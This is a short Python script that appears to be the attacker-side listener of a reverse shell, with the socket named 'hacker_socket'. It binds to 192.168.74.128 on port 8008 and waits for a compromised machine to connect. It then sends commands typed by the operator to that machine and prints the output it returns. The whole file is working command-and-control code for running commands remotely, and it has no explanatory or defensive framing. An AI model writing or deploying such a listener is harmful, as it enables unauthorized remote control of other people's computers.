import socket
if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = "192.168.74.128"
    Port = 8008
    socket_address = (IP, Port)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)
    print("Listening for incoming connection requests")
    hacker_socket, client_address = hacker_socket.accept()
    print("connection established with ", client_address)
    try:
        while True:
            command = input("Enter the command")
            hacker_socket.send(command.encode())
            if command == "stop":
                break
            command_result = hacker_socket.recv(1048)
            print(command_result.decode())
    except Exception:
        print("Exception occured")
        hacker_socket.close()
        